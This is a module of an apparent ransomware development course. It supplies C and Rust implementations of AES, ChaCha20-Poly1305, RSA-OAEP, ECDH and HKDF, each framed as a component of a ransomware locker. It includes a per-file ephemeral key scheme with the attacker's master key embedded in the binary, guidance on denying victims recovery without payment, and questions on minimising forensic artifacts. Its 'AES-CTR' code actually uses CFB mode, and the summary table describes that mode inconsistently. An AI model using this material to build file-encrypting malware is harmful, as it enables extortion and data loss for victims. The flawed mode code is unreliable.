---
title: "Ransomware Red Teaming — Module 2: Cryptographic Algorithms"
description: "AES-256-CBC, ChaCha20-Poly1305, RSA-OAEP, ECDH and HKDF — the cryptographic toolkit behind modern ransomware encryption schemes, with full C and Rust implementations."
author: Aldair Maihuiri
---
# Module 02 — Cryptographic Algorithms


## 2.1 Symmetric Cryptography — AES

### AES-256-CBC (common mode in ransomware)

**Parameters**:

- Key: 256 bits (32 bytes)
- IV: 128 bits (16 bytes) — one per file, random
- Block size: 128 bits (16 bytes)
- Padding: PKCS#7

```
// === AES-256-CBC with Windows CNG (BCrypt) ===
// Advantage: no external dependencies, ships with Windows

#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

typedef struct {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;
    DWORD cbBlock;
    DWORD cbKeyObj;
    PBYTE pbKeyObj;
} AES_CTX;

BOOL AES_Init(AES_CTX *ctx, const BYTE *key, DWORD keyLen) {
    NTSTATUS status;
    DWORD cbResult = 0;

    // Open AES provider
    status = BCryptOpenAlgorithmProvider(
        &ctx->hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return FALSE;

    // Get key object size
    status = BCryptGetProperty(ctx->hAlg, BCRYPT_OBJECT_LENGTH,
        (PBYTE)&ctx->cbKeyObj, sizeof(DWORD), &cbResult, 0);
    if (!BCRYPT_SUCCESS(status)) return FALSE;

    ctx->pbKeyObj = (PBYTE)HeapAlloc(GetProcessHeap(), 0, ctx->cbKeyObj);

    // Get block size
    BCryptGetProperty(ctx->hAlg, BCRYPT_BLOCK_LENGTH,
        (PBYTE)&ctx->cbBlock, sizeof(DWORD), &cbResult, 0);

    // CBC mode
    BCryptSetProperty(ctx->hAlg, BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

    // Generate key object
    status = BCryptGenerateSymmetricKey(
        ctx->hAlg, &ctx->hKey, ctx->pbKeyObj, ctx->cbKeyObj,
        (PBYTE)key, keyLen, 0);

    return BCRYPT_SUCCESS(status);
}

// Encrypt buffer (in-place, with padding)
// Returns output size (may be larger due to padding)
DWORD AES_Encrypt(AES_CTX *ctx, PBYTE iv,
                   PBYTE input, DWORD inputLen,
                   PBYTE output, DWORD outputBufSize) {
    DWORD cbCipherText = 0;
    NTSTATUS status;

    // Calculate padded size
    DWORD padded = ((inputLen / 16) + 1) * 16;
    if (outputBufSize < padded) return 0;

    // Copy input to output (BCrypt can work in-place)
    memcpy(output, input, inputLen);

    status = BCryptEncrypt(
        ctx->hKey,
        output, inputLen,   // input
        NULL,               // padding info
        iv, 16,             // IV (modified → CBC chain)
        output, padded,     // output (in-place)
        &cbCipherText,
        BCRYPT_BLOCK_PADDING
    );

    return BCRYPT_SUCCESS(status) ? cbCipherText : 0;
}

DWORD AES_Decrypt(AES_CTX *ctx, PBYTE iv,
                   PBYTE input, DWORD inputLen,
                   PBYTE output, DWORD outputBufSize) {
    DWORD cbPlainText = 0;
    NTSTATUS status;

    memcpy(output, input, inputLen);

    status = BCryptDecrypt(
        ctx->hKey,
        output, inputLen,
        NULL,
        iv, 16,
        output, inputLen,
        &cbPlainText,
        BCRYPT_BLOCK_PADDING
    );

    return BCRYPT_SUCCESS(status) ? cbPlainText : 0;
}

void AES_Free(AES_CTX *ctx) {
    if (ctx->hKey)    BCryptDestroyKey(ctx->hKey);
    if (ctx->hAlg)    BCryptCloseAlgorithmProvider(ctx->hAlg, 0);
    if (ctx->pbKeyObj) HeapFree(GetProcessHeap(), 0, ctx->pbKeyObj);
}

// === AES-256-CBC in Rust (aes + cbc crates) ===

use aes::Aes256;
use cbc::{Encryptor, Decryptor};
use cbc::cipher::{BlockEncryptMut, BlockDecryptMut, KeyIvInit, block_padding::Pkcs7};

type Aes256CbcEnc = Encryptor<Aes256>;
type Aes256CbcDec = Decryptor<Aes256>;

pub fn aes256_encrypt(key: &[u8; 32], iv: &[u8; 16], data: &[u8]) -> Vec<u8> {
    // Calculate PKCS7-padded size
    let padded_len = ((data.len() / 16) + 1) * 16;
    let mut buf = vec![0u8; padded_len];
    buf[..data.len()].copy_from_slice(data);

    let ct = Aes256CbcEnc::new(key.into(), iv.into())
        .encrypt_padded_mut::<Pkcs7>(&mut buf, data.len())
        .expect("encryption failed");
    ct.to_vec()
}

pub fn aes256_decrypt(key: &[u8; 32], iv: &[u8; 16], ciphertext: &[u8]) -> Vec<u8> {
    let mut buf = ciphertext.to_vec();
    let pt = Aes256CbcDec::new(key.into(), iv.into())
        .decrypt_padded_mut::<Pkcs7>(&mut buf)
        .expect("decryption failed");
    pt.to_vec()
}
```

> **Why AES-256-CBC and not another mode for the first example?** CBC (Cipher Block Chaining) was the dominant ransomware mode until 2020 for practical reasons: it appears as the most common example in OpenSSL and CNG/BCrypt documentation and tutorials, is well-documented, and its padding behavior is predictable — although in both APIs the chaining mode must be specified explicitly, it is not enabled by default. **Each 16-byte block is XOR'd with the previous block's ciphertext before encryption**, making identical plaintext blocks produce different ciphertext — an important property because files have predictable headers (PE headers, Office magic bytes). A random per-file IV is critical: without it, two files with the same beginning would produce the same ciphertext when encrypted with the same key, leaking information to the analyst. The cost of CBC is PKCS#7 padding — each file grows by up to 16 bytes, and the last encryption/decryption operation requires knowing the final size first. This makes it less ideal for very large files or streaming.

### AES-CTR (stream mode — faster, no padding)

```
// AES-256-CTR with BCrypt
// Advantage: no padding required, can encrypt any size

BOOL AES_CTR_Crypt(const BYTE *key, DWORD keyLen,
                    const BYTE *nonce, DWORD nonceLen,
                    PBYTE data, DWORD dataLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    DWORD cbKeyObj = 0, cbResult = 0;
    PBYTE pbKeyObj = NULL;
    BOOL success = FALSE;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbKeyObj, sizeof(DWORD), &cbResult, 0);
    pbKeyObj = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObj);

    // CTR mode
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
        (PBYTE)BCRYPT_CHAIN_MODE_CFB,  // CNG has no native CTR → use CFB
        sizeof(BCRYPT_CHAIN_MODE_CFB), 0);

    BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObj, cbKeyObj,
        (PBYTE)key, keyLen, 0);

    DWORD cbCipherText = 0;
    BCryptEncrypt(hKey, data, dataLen, NULL,
        (PBYTE)nonce, nonceLen, data, dataLen, &cbCipherText, 0);

    success = TRUE;
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    HeapFree(GetProcessHeap(), 0, pbKeyObj);
    return success;
}
```


## 2.2 ChaCha20-Poly1305 (Preferred in Modern Ransomware)

### Why ChaCha20 over AES in ransomware

| Criterion | AES-256-CBC | ChaCha20-Poly1305 |
| - | - | - |
| Speed without AES-NI | Slow | Very fast |
| Speed with AES-NI | Very fast | Fast |
| Authentication | No (pure CBC) | Yes (Poly1305 MAC) |
| Padding | Required | No |
| Nonce size | 16 bytes | 12 bytes |
| Ransomware use | WannaCry, REvil | BlackCat, Akira |

ChaCha20 does not use AES-NI → equally fast on legacy VMs and embedded systems.

```
// ChaCha20-Poly1305 in C (manual implementation)
// Windows does not have native BCrypt ChaCha20 on all versions
// Using a pure implementation

#include <stdint.h>
#include <string.h>

// ChaCha20 quarter round
#define QR(a,b,c,d) \
    a += b; d ^= a; d = (d << 16) | (d >> 16); \
    c += d; b ^= c; b = (b << 12) | (b >> 20); \
    a += b; d ^= a; d = (d <<  8) | (d >> 24); \
    c += d; b ^= c; b = (b <<  7) | (b >> 25);

typedef struct {
    uint32_t state[16];
    uint8_t keystream[64];
    int pos;
} ChaCha20Ctx;

static void chacha20_block(uint32_t out[16], const uint32_t in[16]) {
    uint32_t x[16];
    memcpy(x, in, 64);

    for (int i = 0; i < 10; i++) {
        // Column rounds
        QR(x[0], x[4], x[8],  x[12]);
        QR(x[1], x[5], x[9],  x[13]);
        QR(x[2], x[6], x[10], x[14]);
        QR(x[3], x[7], x[11], x[15]);
        // Diagonal rounds
        QR(x[0], x[5], x[10], x[15]);
        QR(x[1], x[6], x[11], x[12]);
        QR(x[2], x[7], x[8],  x[13]);
        QR(x[3], x[4], x[9],  x[14]);
    }
    for (int i = 0; i < 16; i++) out[i] = x[i] + in[i];
}

void chacha20_init(ChaCha20Ctx *ctx,
                   const uint8_t key[32],
                   const uint8_t nonce[12],
                   uint32_t counter) {
    // Constant "expand 32-byte k"
    ctx->state[0]  = 0x61707865;
    ctx->state[1]  = 0x3320646e;
    ctx->state[2]  = 0x79622d32;
    ctx->state[3]  = 0x6b206574;

    // Key (little-endian)
    for (int i = 0; i < 8; i++) {
        ctx->state[4+i] = ((uint32_t)key[i*4])        |
                          ((uint32_t)key[i*4+1] <<  8) |
                          ((uint32_t)key[i*4+2] << 16) |
                          ((uint32_t)key[i*4+3] << 24);
    }

    ctx->state[12] = counter;  // Block counter

    // Nonce (96-bit)
    for (int i = 0; i < 3; i++) {
        ctx->state[13+i] = ((uint32_t)nonce[i*4])        |
                           ((uint32_t)nonce[i*4+1] <<  8) |
                           ((uint32_t)nonce[i*4+2] << 16) |
                           ((uint32_t)nonce[i*4+3] << 24);
    }

    ctx->pos = 64;  // Force generation of first block
}

void chacha20_crypt(ChaCha20Ctx *ctx, uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if (ctx->pos == 64) {
            // Generate new keystream block
            uint32_t block[16];
            chacha20_block(block, ctx->state);
            memcpy(ctx->keystream, block, 64);
            ctx->state[12]++;  // Increment counter
            ctx->pos = 0;
        }
        data[i] ^= ctx->keystream[ctx->pos++];
    }
}

// ChaCha20-Poly1305 in Rust (chacha20poly1305 crate)

use chacha20poly1305::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    ChaCha20Poly1305, Nonce, Key
};

pub struct ChaChaCipher {
    cipher: ChaCha20Poly1305,
}

impl ChaChaCipher {
    pub fn new(key: &[u8; 32]) -> Self {
        let cipher = ChaCha20Poly1305::new(Key::from_slice(key));
        Self { cipher }
    }

    pub fn encrypt(&self, nonce: &[u8; 12], data: &[u8]) -> Vec<u8> {
        let nonce = Nonce::from_slice(nonce);
        self.cipher.encrypt(nonce, data).expect("encryption failure")
    }

    pub fn decrypt(&self, nonce: &[u8; 12], ciphertext: &[u8]) -> Vec<u8> {
        let nonce = Nonce::from_slice(nonce);
        self.cipher.decrypt(nonce, ciphertext).expect("decryption failure")
    }

    // Generate random nonce
    pub fn random_nonce() -> [u8; 12] {
        let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng);
        nonce.into()
    }

    // Generate random key
    pub fn random_key() -> [u8; 32] {
        let key = ChaCha20Poly1305::generate_key(&mut OsRng);
        key.into()
    }
}
```

> **Why did ChaCha20-Poly1305 become the preferred algorithm in modern ransomware?** The reason is not purely technical — it is operational. Hardware-accelerated AES (AES-NI) is faster on Intel/AMD CPUs with native support. The problem: the most valuable ransomware targets in 2022-2026 are VMware ESXi and Linux virtualization servers, where AES-NI is frequently disabled or not exposed to the guest VM. Under those conditions, AES-CTR drops to ~300 MB/s (pure software) while ChaCha20 maintains ~800-1000 MB/s because its design (ADD-ROTATE-XOR over 32-bit registers) is efficient on any CPU without specialized instructions. The Poly1305 layer provides integrated authentication (AEAD): if a single ciphertext bit is modified (honeypot, EDR altering data in flight), the MAC fails and decryption aborts — tampering protection that pure AES-CBC lacks. BlackCat/ALPHV and Akira adopted ChaCha20 specifically to maximize speed on virtualization targets.


## 2.3 RSA — Asymmetric Cryptography

### RSA-OAEP (for encrypting symmetric keys)

```
// RSA-OAEP with Windows CNG

// Encrypt up to 190 bytes (RSA-2048 with OAEP-SHA256)
DWORD RSA_OAEP_Encrypt(PBYTE publicKeyBlob, DWORD publicKeyBlobLen,
                        const BYTE *plaintext, DWORD plaintextLen,
                        PBYTE ciphertext, DWORD ciphertextBufLen) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbCiphertext = 0;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);

    // Import public key from blob
    status = BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB,
        &hKey, publicKeyBlob, publicKeyBlobLen, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;

    // OAEP with SHA-256
    BCRYPT_OAEP_PADDING_INFO paddingInfo = {
        .pszAlgId = BCRYPT_SHA256_ALGORITHM,
        .pbLabel = NULL,
        .cbLabel = 0
    };

    status = BCryptEncrypt(hKey,
        (PBYTE)plaintext, plaintextLen,
        &paddingInfo,
        NULL, 0,  // No IV for RSA
        ciphertext, ciphertextBufLen,
        &cbCiphertext,
        BCRYPT_PAD_OAEP);

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return BCRYPT_SUCCESS(status) ? cbCiphertext : 0;
}

// Export public key to BCrypt blob from PEM
// (to import the attacker's key embedded in the binary)
// Format: BCRYPT_RSAKEY_BLOB + exponent + modulus

typedef struct {
    BCRYPT_RSAKEY_BLOB header;
    BYTE publicExponent[3];  // 0x01 0x00 0x01 = 65537
    BYTE modulus[256];       // 2048 bits
} RSA2048_PUBLIC_BLOB;

// RSA-OAEP in Rust (rsa crate)

use rsa::{RsaPublicKey, RsaPrivateKey, Oaep, pkcs8::DecodePublicKey};
use sha2::Sha256;
use rand::rngs::OsRng;

pub fn rsa_encrypt_key(public_key_pem: &str, data: &[u8]) -> Vec<u8> {
    let public_key = RsaPublicKey::from_public_key_pem(public_key_pem)
        .expect("Invalid PEM");

    let mut rng = OsRng;
    let padding = Oaep::new::<Sha256>();

    public_key.encrypt(&mut rng, padding, data)
        .expect("RSA encryption failed")
}

pub fn rsa_decrypt_key(private_key_pem: &str, ciphertext: &[u8]) -> Vec<u8> {
    use rsa::pkcs8::DecodePrivateKey;
    let private_key = RsaPrivateKey::from_pkcs8_pem(private_key_pem)
        .expect("Invalid PEM");

    let padding = Oaep::new::<Sha256>();
    private_key.decrypt(padding, ciphertext)
        .expect("RSA decryption failed")
}

// Generate RSA-2048 keypair
pub fn generate_rsa_keypair() -> (String, String) {
    let mut rng = OsRng;
    let private_key = RsaPrivateKey::new(&mut rng, 2048)
        .expect("Failed to generate key");
    let public_key = RsaPublicKey::from(&private_key);

    use rsa::pkcs8::{EncodePrivateKey, EncodePublicKey};
    let priv_pem = private_key.to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
        .unwrap().to_string();
    let pub_pem = public_key.to_public_key_pem(rsa::pkcs8::LineEnding::LF)
        .unwrap();

    (priv_pem, pub_pem)
}
```

> **Why RSA-OAEP and not RSA-PKCS1v1.5 for encrypting symmetric keys?** PKCS#1 v1.5 is vulnerable to the "Bleichenbacher attack" (1998): an oracle that responds differently to "invalid padding" versus "other errors" allows an attacker to recover the encrypted plaintext without the private key, given enough attempts (~1 million queries). In a system where the decryptor gives feedback about whether the key was decrypted correctly, PKCS1v1.5 would be exploitable. OAEP (Optimal Asymmetric Encryption Padding) uses randomization and hashing to eliminate this structural vulnerability. For ransomware, the choice has additional implications: the decryptor delivered to the victim should not reveal whether a decryption attempt failed due to a "wrong key" or "invalid padding" — a unified "decryption failed" response blocks the oracle. The practical limit of RSA-2048 with OAEP-SHA256 is ~190 bytes of plaintext, sufficient to protect a 32-byte AES key but not for direct data encryption.


## 2.4 ECDH + X25519/P-256 Curve (State of the Art)

### Why ECDH instead of RSA

| RSA-2048 | ECDH-P256 |
| - | - |
| 2048-bit key | 256-bit key |
| Slow keygen | Very fast |
| Large overhead | Small |
| Well-studied | Equally secure |

Modern ransomware (BlackCat, Akira) uses ECDH.

### Multi-Master Pattern (MMP) — How they use it

```
SETUP (Builder, attacker):
  master_priv, master_pub = ECDH_keygen()
  # master_priv → attacker's C2
  # master_pub  → embedded in the ransomware binary

RUNTIME (Locker, on victim):
  For each file:
    file_priv, file_pub = ECDH_keygen()  # Ephemeral pair per file
    shared_secret = ECDH(file_priv, master_pub)  # ECDH with master
    file_key = KDF(shared_secret)         # Derive AES key
    encrypt(file, file_key)
    write_footer(file_pub)                # Store the file's public key
    # file_priv → DESTROY immediately

DECRYPTION (Attacker):
  For each file:
    file_pub = read_footer(file)
    shared_secret = ECDH(master_priv, file_pub)  # Only the attacker can do this
    file_key = KDF(shared_secret)
    decrypt(file, file_key)

// ECDH with Windows CNG (P-256)

#include <bcrypt.h>

BOOL ECDH_GenerateKeyPair(BCRYPT_KEY_HANDLE *phKey,
                           PBYTE *ppubKeyBlob, DWORD *pcbPubKey) {
    BCRYPT_ALG_HANDLE hAlg;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_ECDH_P256_ALGORITHM, NULL, 0);
    BCryptGenerateKeyPair(hAlg, phKey, 256, 0);
    BCryptFinalizeKeyPair(*phKey, 0);

    // Export public key
    BCryptExportKey(*phKey, NULL, BCRYPT_ECCPUBLIC_BLOB, NULL, 0, pcbPubKey, 0);
    *ppubKeyBlob = (PBYTE)HeapAlloc(GetProcessHeap(), 0, *pcbPubKey);
    BCryptExportKey(*phKey, NULL, BCRYPT_ECCPUBLIC_BLOB,
        *ppubKeyBlob, *pcbPubKey, pcbPubKey, 0);

    BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;
}

// Compute ECDH shared secret
BOOL ECDH_ComputeShared(BCRYPT_KEY_HANDLE hMyPrivKey,
                         PBYTE peerPubKeyBlob, DWORD peerPubKeyBlobLen,
                         PBYTE *ppSharedSecret, DWORD *pcbSharedSecret) {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hPeerKey;
    BCRYPT_SECRET_HANDLE hSecret;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_ECDH_P256_ALGORITHM, NULL, 0);

    // Import peer's public key
    BCryptImportKeyPair(hAlg, NULL, BCRYPT_ECCPUBLIC_BLOB,
        &hPeerKey, peerPubKeyBlob, peerPubKeyBlobLen, 0);

    // Compute shared secret
    BCryptSecretAgreement(hMyPrivKey, hPeerKey, &hSecret, 0);

    // Derive key material (KDF)
    BCryptDeriveKey(hSecret, BCRYPT_KDF_HASH, NULL,
        NULL, 0, pcbSharedSecret, 0);
    *ppSharedSecret = (PBYTE)HeapAlloc(GetProcessHeap(), 0, *pcbSharedSecret);
    BCryptDeriveKey(hSecret, BCRYPT_KDF_HASH, NULL,
        *ppSharedSecret, *pcbSharedSecret, pcbSharedSecret, 0);

    BCryptDestroySecret(hSecret);
    BCryptDestroyKey(hPeerKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return TRUE;
}

// X25519 ECDH in Rust (faster than P-256)

use x25519_dalek::{EphemeralSecret, PublicKey, StaticSecret};
use rand_core::OsRng;
use sha2::{Sha256, Digest};

pub struct ECDHKeyPair {
    secret: StaticSecret,
    pub public: PublicKey,
}

impl ECDHKeyPair {
    pub fn generate() -> Self {
        let secret = StaticSecret::random_from_rng(OsRng);
        let public = PublicKey::from(&secret);
        Self { secret, public }
    }

    // Computed shared secret + KDF → AES key
    pub fn derive_file_key(&self, peer_public: &[u8; 32]) -> [u8; 32] {
        let peer_pub = PublicKey::from(*peer_public);
        let shared = self.secret.diffie_hellman(&peer_pub);

        // KDF: SHA-256 of the shared secret
        let mut hasher = Sha256::new();
        hasher.update(shared.as_bytes());
        let result = hasher.finalize();

        let mut key = [0u8; 32];
        key.copy_from_slice(&result);
        key
    }

    pub fn public_bytes(&self) -> [u8; 32] {
        *self.public.as_bytes()
    }
}

// Usage example in the locker:
pub fn encrypt_file_ecdh(
    master_public_bytes: &[u8; 32],  // Embedded in binary
    file_data: &[u8]
) -> (Vec<u8>, [u8; 32]) {  // (ciphertext, ephemeral_pub_to_store_in_footer)

    // Generate ephemeral pair for this file
    let ephemeral = ECDHKeyPair::generate();

    // Derive AES key from shared secret
    let file_key = ephemeral.derive_file_key(master_public_bytes);
    let nonce = ChaChaCipher::random_nonce();

    let cipher = ChaChaCipher::new(&file_key);
    let ciphertext = cipher.encrypt(&nonce, file_data);

    // The ephemeral public key goes into the file footer
    // The attacker can reconstruct the shared secret with their master_private
    (ciphertext, ephemeral.public_bytes())
}
```

> **Why the Multi-Master Pattern (MMP) with a per-file ephemeral ECDH keypair instead of a single ECDH key per session?** A single session key design creates a critical vulnerability: if the analyst or victim can extract the session key by any means (memory dump, reverse engineering the C2 handshake), all files in that session are recoverable. With MMP and per-file ephemeral keypairs, compromising a single file's key affects only that file. Additionally, MMP requires no C2 communication during encryption — the locker generates an ephemeral pair locally, computes the shared secret with the embedded `master_pub`, derives the `file_key`, encrypts, destroys the ephemeral private key, and stores only the public key in the footer. All of this without a single byte sent to any server during the operation. This is critical for air-gapped operations and for generating no detectable network traffic during encryption. The cost: the footer must contain 32–72 bytes of public key per file, and the attacker needs their `master_priv` to decrypt — if that key is lost, no one can ever decrypt.


## 2.5 HKDF — Key Derivation Function

When you have an ECDH shared secret, you need to derive cryptographically sound keys from it.

```
// HKDF-SHA256 (extract + expand)

#include <bcrypt.h>
#include <string.h>

// HMAC-SHA256
void HMAC_SHA256(const BYTE *key, DWORD keyLen,
                  const BYTE *data, DWORD dataLen,
                  BYTE output[32]) {
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_HASH_HANDLE hHash;
    DWORD cbHash = 0, cbResult = 0;

    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM,
        NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);

    DWORD cbHashObj;
    BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
        (PBYTE)&cbHashObj, sizeof(DWORD), &cbResult, 0);
    PBYTE pbHashObj = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbHashObj);

    BCryptCreateHash(hAlg, &hHash, pbHashObj, cbHashObj,
        (PBYTE)key, keyLen, 0);
    BCryptHashData(hHash, (PBYTE)data, dataLen, 0);
    BCryptFinishHash(hHash, output, 32, 0);

    BCryptDestroyHash(hHash);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    HeapFree(GetProcessHeap(), 0, pbHashObj);
}

// HKDF-Extract: PRK = HMAC-SHA256(salt, IKM)
void HKDF_Extract(const BYTE *salt, DWORD saltLen,
                   const BYTE *ikm, DWORD ikmLen,
                   BYTE prk[32]) {
    BYTE defaultSalt[32] = {0};  // If no salt, use zeros
    if (!salt || saltLen == 0) {
        salt = defaultSalt;
        saltLen = 32;
    }
    HMAC_SHA256(salt, saltLen, ikm, ikmLen, prk);
}

// HKDF-Expand: OKM = T(1) || T(2) || ...
void HKDF_Expand(const BYTE prk[32], const BYTE *info, DWORD infoLen,
                  BYTE *okm, DWORD okmLen) {
    BYTE t[32] = {0};
    DWORD pos = 0;
    BYTE counter = 1;

    while (pos < okmLen) {
        // Input = T(i-1) || info || counter
        BYTE hmac_input[32 + 256 + 1];
        DWORD hmac_input_len = 0;
        if (counter > 1) {
            memcpy(hmac_input, t, 32);
            hmac_input_len = 32;
        }
        memcpy(hmac_input + hmac_input_len, info, infoLen);
        hmac_input_len += infoLen;
        hmac_input[hmac_input_len++] = counter;

        HMAC_SHA256(prk, 32, hmac_input, hmac_input_len, t);

        DWORD copy = min(32, okmLen - pos);
        memcpy(okm + pos, t, copy);
        pos += copy;
        counter++;
    }
}

// Usage: derive AES key and IV from ECDH shared secret
void DeriveKeys(const BYTE *sharedSecret, DWORD secretLen,
                 BYTE aesKey[32], BYTE aesIV[16]) {
    BYTE prk[32];
    BYTE okm[48];  // 32 (key) + 16 (IV) = 48 bytes

    HKDF_Extract(NULL, 0, sharedSecret, secretLen, prk);
    HKDF_Expand(prk, (BYTE*)"ransomware-key", 14, okm, 48);

    memcpy(aesKey, okm, 32);
    memcpy(aesIV, okm + 32, 16);
}
```

> **Why can't the ECDH shared secret be used directly as an AES key?** The ECDH output is the X-coordinate of an elliptic curve point — a number with specific mathematical structure, not a uniformly random bit string. Some problematic properties: the low-order bits may have statistical bias depending on the curve; the size is fixed (32 bytes for P-256/X25519) but may need to expand into more key material (AES key + IV + MAC key); and using the same input in different contexts (encryption, authentication) creates related-key attack risks. HKDF (RFC 5869) resolves all of this in two steps: Extract (HMAC of the IKM with a salt, produces a PRK with uniform distribution) and Expand (arbitrary-length generation with context/info, allowing multiple independent keys to be derived from the same secret). In the footer context: `DeriveKeys(shared_secret)` produces 48 bytes — the first 32 are the AES key, the last 16 are the IV, both with statistical independence properties that the raw shared secret does not guarantee.


## 2.6 Secure Random Generation (CSPRNG)

A weak PRNG makes encryption keys predictable — regardless of how strong the cipher that uses them is.

```
// Correct: BCryptGenRandom (CSPRNG)

BOOL GenerateRandomBytes(PBYTE buffer, DWORD length) {
    return BCRYPT_SUCCESS(
        BCryptGenRandom(NULL, buffer, length, BCRYPT_USE_SYSTEM_PREFERRED_RNG)
    );
}

// Generate key and IV for a file
void GenerateFileKeyIV(BYTE key[32], BYTE iv[16]) {
    BCryptGenRandom(NULL, key, 32, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
    BCryptGenRandom(NULL, iv, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
}

// INCORRECT — never use in cryptographic production:
// srand(time(NULL)); rand();  ← predictable, not cryptographically secure

// Rust: OsRng is always a CSPRNG

use rand::{RngCore, rngs::OsRng};

pub fn random_bytes<const N: usize>() -> [u8; N] {
    let mut buf = [0u8; N];
    OsRng.fill_bytes(&mut buf);
    buf
}

pub fn generate_key_iv() -> ([u8; 32], [u8; 12]) {
    (random_bytes::<32>(), random_bytes::<12>())
}
```

**Why is a weak PRNG so devastating and not just an "implementation detail"?** A classic error in amateur ransomware is seeding a non-cryptographic generator (`rand()`, `Math.random()`, etc.) with a predictable source such as the infection timestamp. The cascade problem: (1) the process timestamp can be extracted from the file system (creation time of the `.exe`, timestamps of the encrypted files); (2) with an estimated infection time window, an analyst can brute-force the seed by trying each possible second — with a 24-hour window, only ~86,400 values; (3) the cryptanalysis does not need to break AES-256 (computationally impossible) but rather the weak generator that produced the keys.

A real-world example of this class of failure is **Petya (2016)**, whose key generation algorithm was so flawed that it allowed an analyst to predict half of the keystream — researcher @leostone built a genetic algorithm capable of recovering the decryption key in as little as ~7 seconds, without attacking AES or the attacker's private key.

`BCryptGenRandom` with `BCRYPT_USE_SYSTEM_PREFERRED_RNG` uses the default Windows CNG CSPRNG — an **AES-based CTR_DRBG compliant with NIST SP800-90**, seeded with real system entropy — the only appropriate source for cryptographic use. The difference in code: 2 lines. The impact: the difference between "unrecoverable without C2" and "full recovery without paying."


## 2.7 Speed Comparison (Real Benchmarks)

For a 1 GB file on modern hardware (i7-12700, AES-NI enabled):

| Algorithm | Speed | Notes |
| - | - | - |
| AES-256-CTR (AES-NI) | ~2.5 GB/s | Fastest with hardware support |
| AES-256-CBC (AES-NI) | ~2.0 GB/s | Padding overhead |
| ChaCha20-Poly1305 | ~1.8 GB/s | Without AES-NI: equally fast or faster |
| AES-256-CTR (no AES-NI) | ~300 MB/s | Very slow in VMs without AES-NI |

Conclusion: if the ransomware must run on varied hardware (including VMs without AES-NI), ChaCha20-Poly1305 offers more consistent performance. If the target is modern Windows endpoints with recent CPUs, AES-256-CTR with AES-NI remains the fastest option.


## Module 02 Summary

| Algorithm | Use | Windows API |
| - | - | - |
| AES-256-CBC | Encrypt files (legacy) | BCrypt CBC |
| AES-256-CTR | Encrypt files (no padding) | Manual (ECB block-by-block + counter, CNG has no native CTR) |
| ChaCha20-Poly1305 | Encrypt files (modern) | Manual or Rust crate |
| RSA-2048-OAEP | Encrypt symmetric keys | BCrypt RSA |
| ECDH-P256/X25519 | Ephemeral public key scheme | BCrypt ECDH / crate |
| HKDF-SHA256 | Derive keys from ECDH | BCrypt native (`BCryptKeyDerivation` + `BCRYPT_KDF_HKDF`, Windows 8+) |
| BCryptGenRandom | CSPRNG | BCrypt |


Xtra:

- **Explain the difference between a block cipher (AES-CBC) and a stream cipher (AES-CTR, ChaCha20). Why does CBC require padding while CTR/ChaCha20 do not?**

- **What happens exactly if you reuse the same IV + the same key on two different files with CBC?**

- **What happens if you reuse the same nonce + the same key with ChaCha20-Poly1305?**

- **Why is it called "nonce" in ChaCha20 and "IV" in CBC? Is it just terminology or is there a functional difference?**

- **In the MMP (Multi-Master Pattern) scheme with per-file ephemeral ECDH:**
  - How many keys are generated per file?
  - Which key is destroyed immediately and why?
  - What is stored in the file footer and why is it safe to store it there?

- **The module states that MMP generates no network traffic during encryption:**
  - What network IOCs would an EDR/SOC look for to detect ransomware if there is no C2 during encryption?
  - What other artifacts (disk, memory, registry) could betray the behavior?
  - How could an attacker minimize those artifacts?


**Next**: Module 03 — Key generation algorithms (master key, session key, per-file key)

---

© 2026 Aldair Maihuiri. All rights reserved. Sharing with attribution to the author is permitted. Reproduction without prior authorization is prohibited.
